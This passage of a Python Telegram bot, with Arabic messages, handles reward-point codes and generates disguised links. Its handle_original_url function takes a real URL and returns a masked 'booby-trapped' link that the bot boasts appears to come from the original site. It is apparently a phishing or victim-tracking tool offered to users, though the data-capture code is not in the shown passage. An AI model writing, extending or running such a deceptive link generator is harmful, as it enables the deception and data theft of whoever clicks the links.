            bot.reply_to(
                message,
                "❌ **استخدم:** `/create_reward [عدد النقاط] [عدد الأعضاء]`\n"
                "مثال: `/create_reward 50 10`\n\n"
                "يعني: 50 نقطة لكل من أول 10 أشخاص يستخدمون الكود"
            )
            return
        
        points = int(parts[1])
        member_count = int(parts[2])
        
        code = secrets.token_hex(4).upper()
        create_group_reward(user_id, points, member_count, code)
        
        bot.reply_to(
            message,
            f"✅ **تم إنشاء المكافأة!**\n\n"
            f"🔑 **الكود:** `{code}`\n"
            f"⭐ **النقاط:** {points} نقطة لكل مستخدم\n"
            f"👥 **العدد:** {member_count} مستخدم\n\n"
            f"📌 **للاستخدام:** أرسل هذا الكود للمستخدمين، وسيحصلون على النقاط عند استخدام الأمر:\n"
            f"`/use_reward {code}`"
        )
    except ValueError:
        bot.reply_to(message, "❌ تأكد من أن الأرقام صحيحة")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {e}")

@bot.message_handler(commands=['use_reward'])
def use_reward_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user:
        bot.reply_to(message, "❌ يرجى استخدام /start أولاً")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(
                message,
                "❌ **استخدم:** `/use_reward [الكود]`\n"
                "مثال: `/use_reward ABC123`"
            )
            return
        
        code = parts[1].upper()
        result, data = use_group_reward(code, user_id)
        
        if result:
            user = get_user(user_id)
            bot.reply_to(
                message,
                f"✅ **تم استلام المكافأة!**\n\n"
                f"⭐ تم إضافة **{data}** نقاط إلى رصيدك.\n"
                f"💰 رصيدك الحالي: **{user['points']}** نقطة."
            )
        else:
            if data == 'already_used':
                bot.reply_to(message, "❌ لقد استخدمت هذا الكود مسبقاً")
            elif data == 'full':
                bot.reply_to(message, "❌ تم استخدام هذا الكود بالكامل (انتهى العدد المحدد)")
            elif data == 'not_found':
                bot.reply_to(message, "❌ الكود غير صحيح")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {e}")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, '').startswith('waiting_url_'))
def handle_original_url(message):
    user_id = message.from_user.id
    state = user_states.get(user_id, '')
    if not state.startswith('waiting_url_'):
        return
    feature = state.replace('waiting_url_', '')
    original_url = message.text.strip()
    
    if not is_valid_url(original_url):
        bot.reply_to(message, "❌ الرابط غير صحيح. أرسل رابطاً صالحاً (مثل: https://example.com)")
        return
    
    # إنشاء الجلسة
    session_id = create_session(user_id, feature, original_url, {})
    
    # إنشاء الرابط المقنع
    masked_link = create_short_link(session_id, original_url)
    
    del user_states[user_id]
    
    bot.reply_to(message, f"""
🔗 **تم إنشاء الرابط الملغم**

📌 **الرابط المقنع:**
<code>{masked_link}</code>

🔗 **الرابط الأصلي:**
<code>{original_url}</code>

📋 **الميزة:** {feature}
⏱ الصلاحية: 10 دقائق

⚠️ الرابط يبدو وكأنه من الموقع الأصلي!
    """, parse_mode='HTML')
    
# ====== تشغيل البوت ======
def run_bot():
    print("🤖 بدء تشغيل البوت...")
    try:
        bot.delete_webhook()
        print("✅ تم حذف Webhook القديم")
    except Exception as e:
        print(f"⚠️ خطأ في حذف Webhook: {e}")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1)
        except Exception as e:
            print(f"⚠️ خطأ في البوت: {e}")
            time.sleep(5)

# ====== بدء التشغيل ======
print("🚀 جاري تهيئة قاعدة البيانات...")
init_db()
print("✅ قاعدة البيانات جاهزة")

bot_thread = threading.Thread(target=run_bot, daemon=True)
bot_thread.start()
print("🤖 تم تشغيل البوت في الخلفية")

# ============================================================
#  تشغيل السيرفر
# ============================================================

if __name__ != '__main__':
    print("🚀 السيرفر جاهز للعمل مع gunicorn")
else:
    app.run(host='0.0.0.0', port=5000)
